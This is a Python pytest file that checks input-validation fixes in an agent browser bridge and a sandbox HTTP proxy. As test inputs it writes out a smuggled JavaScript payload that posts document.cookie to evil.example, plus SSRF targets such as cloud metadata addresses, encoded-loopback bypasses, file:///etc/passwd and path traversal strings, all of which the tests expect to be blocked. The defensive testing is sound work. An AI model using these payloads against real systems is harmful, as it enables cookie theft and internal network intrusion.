"""Input-validation hardening for agent-facing execution surfaces.

Covers four confirmed findings:
  - AWI scroll: client-supplied ``amount`` was interpolated into a JS
    expression executed via page.evaluate (script injection).
  - AWI navigate_to / create_session: any URL was accepted, including
    ``file://`` (host file read) and link-local/RFC1918 targets (SSRF).
  - AWI upload_file: any host file path could be uploaded to a remote page
    (arbitrary file exfiltration).
  - Behavioral sandbox HTTP proxy: the environment's ``network_access``
    flag was never enforced, and the URL was fetched unchecked (SSRF).
"""

from __future__ import annotations

import pytest

from app.core.config import get_settings
from app.core.url_guard import check_outbound_url
from app.services.awi_playwright_bridge import AWIPlaywrightBridge, BridgeSession
from app.services.behavioral_sandbox import BehavioralSandboxEngine


@pytest.fixture
def bridge():
    return AWIPlaywrightBridge()


@pytest.fixture
def session():
    return BridgeSession(session_id="test-session", current_url="https://example.com")


class TestOutboundUrlGuard:
    @pytest.mark.anyio
    @pytest.mark.parametrize(
        "url,reason",
        [
            ("file:///etc/passwd", "scheme_not_allowed"),
            ("javascript:alert(1)", "scheme_not_allowed"),
            ("data:text/html,<script>1</script>", "scheme_not_allowed"),
            ("ftp://example.com/x", "scheme_not_allowed"),
            ("http://", "missing_host"),
            ("http://127.0.0.1:8000/admin", "private_address_blocked"),
            ("http://10.0.0.5/internal", "private_address_blocked"),
            ("http://192.168.1.1/", "private_address_blocked"),
            ("http://169.254.169.254/latest/meta-data/", "private_address_blocked"),
            ("http://[::1]:6379/", "private_address_blocked"),
            ("http://localhost:8080/", "private_host_blocked"),
            ("http://metadata.google.internal/computeMetadata/", "private_host_blocked"),
            ("http://foo.internal/", "private_host_blocked"),
        ],
    )
    async def test_dangerous_targets_are_blocked(self, url, reason):
        assert await check_outbound_url(url) == reason

    @pytest.mark.anyio
    async def test_public_https_url_is_allowed(self):
        assert await check_outbound_url("https://example.com/page") is None

    @pytest.mark.anyio
    @pytest.mark.parametrize(
        "url",
        [
            "http://2130706433/",              # decimal-encoded 127.0.0.1
            "http://0x7f000001/",              # hex-encoded 127.0.0.1
            "http://017700000001/",            # octal-encoded 127.0.0.1
            "http://0/",                       # 0.0.0.0
            "http://evil.example.com@127.0.0.1/",  # userinfo confusion
            "http://[::ffff:169.254.169.254]/",    # ipv6-mapped metadata
        ],
    )
    async def test_ip_encoding_tricks_are_blocked(self, url):
        # These resolve to loopback/metadata despite not being dotted-quad
        # literals; the guard must still reject them.
        assert await check_outbound_url(url) == "private_address_blocked"

    @pytest.mark.anyio
    async def test_userinfo_does_not_mask_a_public_host(self):
        # Here the real host is the public one; the loopback string is only
        # userinfo and must not trigger a false block.
        assert await check_outbound_url("http://127.0.0.1@example.com/") is None

    @pytest.mark.anyio
    async def test_private_target_escape_hatch_never_allows_file_scheme(
        self, monkeypatch
    ):
        monkeypatch.setattr(get_settings(), "ALLOW_PRIVATE_NETWORK_TARGETS", True)
        assert await check_outbound_url("http://127.0.0.1:8000/") is None
        assert (
            await check_outbound_url("file:///etc/passwd") == "scheme_not_allowed"
        )


class TestAWIScrollInjection:
    @pytest.mark.anyio
    async def test_non_numeric_scroll_amount_is_rejected(self, bridge, session):
        with pytest.raises(ValueError, match="integer"):
            await bridge._handle_scroll(
                session,
                {"amount": "300); fetch('https://evil.example', "
                 "{method:'POST', body: document.cookie}); (0"},
            )

    @pytest.mark.anyio
    async def test_numeric_scroll_amount_still_works(self, bridge, session):
        commands = await bridge._handle_scroll(session, {"amount": "250"})
        assert commands[0].target == "window.scrollBy(0, 250)"

    @pytest.mark.anyio
    async def test_scroll_amount_is_clamped(self, bridge, session):
        commands = await bridge._handle_scroll(session, {"amount": 10**9})
        assert commands[0].target == "window.scrollBy(0, 20000)"


class TestAWINavigationGuard:
    @pytest.mark.anyio
    @pytest.mark.parametrize(
        "url",
        [
            "file:///etc/passwd",
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:8080/",
        ],
    )
    async def test_navigate_to_blocks_dangerous_urls(self, bridge, session, url):
        with pytest.raises(ValueError, match="navigation blocked"):
            await bridge._handle_navigate_to(session, {"url": url})

    @pytest.mark.anyio
    async def test_navigate_to_allows_public_url(self, bridge, session):
        commands = await bridge._handle_navigate_to(
            session, {"url": "https://example.com/products"}
        )
        assert commands[0].target == "https://example.com/products"

    @pytest.mark.anyio
    async def test_create_session_blocks_file_scheme(self, bridge):
        with pytest.raises(ValueError, match="navigation blocked"):
            await bridge.create_session("file:///etc/passwd")


class TestAWIUploadConfinement:
    def test_uploads_disabled_without_configured_dir(self, monkeypatch):
        monkeypatch.setattr(get_settings(), "AWI_UPLOAD_DIR", "")
        with pytest.raises(ValueError, match="disabled"):
            AWIPlaywrightBridge._confine_upload_path("report.pdf")

    def test_absolute_host_path_outside_root_is_blocked(self, monkeypatch, tmp_path):
        monkeypatch.setattr(get_settings(), "AWI_UPLOAD_DIR", str(tmp_path))
        with pytest.raises(ValueError, match="escapes"):
            AWIPlaywrightBridge._confine_upload_path("/etc/passwd")

    def test_traversal_out_of_root_is_blocked(self, monkeypatch, tmp_path):
        monkeypatch.setattr(get_settings(), "AWI_UPLOAD_DIR", str(tmp_path))
        with pytest.raises(ValueError, match="escapes"):
            AWIPlaywrightBridge._confine_upload_path("../../etc/passwd")

    def test_staged_file_inside_root_is_allowed(self, monkeypatch, tmp_path):
        monkeypatch.setattr(get_settings(), "AWI_UPLOAD_DIR", str(tmp_path))
        resolved = AWIPlaywrightBridge._confine_upload_path("docs/report.pdf")
        assert resolved == str(tmp_path / "docs" / "report.pdf")


class TestSandboxHttpProxyGuard:
    @pytest.fixture
    def engine(self):
        return BehavioralSandboxEngine(redis_url="redis://localhost:6379")

    @pytest.mark.anyio
    async def test_network_access_flag_is_enforced(self, engine):
        result = await engine._execute_http_proxy(
            "http_get",
            {"url": "https://example.com/"},
            False,
            5,
            network_access=False,
        )
        assert result["success"] is False
        assert "network_access is disabled" in result["error"]

    @pytest.mark.anyio
    async def test_ssrf_target_blocked_even_with_network_access(self, engine):
        result = await engine._execute_http_proxy(
            "http_get",
            {"url": "http://169.254.169.254/latest/meta-data/"},
            False,
            5,
            network_access=True,
        )
        assert result["success"] is False
        assert "request blocked" in result["error"]

    @pytest.mark.anyio
    async def test_dry_run_never_touches_the_network(self, engine):
        result = await engine._execute_http_proxy(
            "http_get",
            {"url": "http://169.254.169.254/latest/meta-data/"},
            True,
            5,
            network_access=False,
        )
        assert result["success"] is True
        assert result["output"]["dry_run"] is True
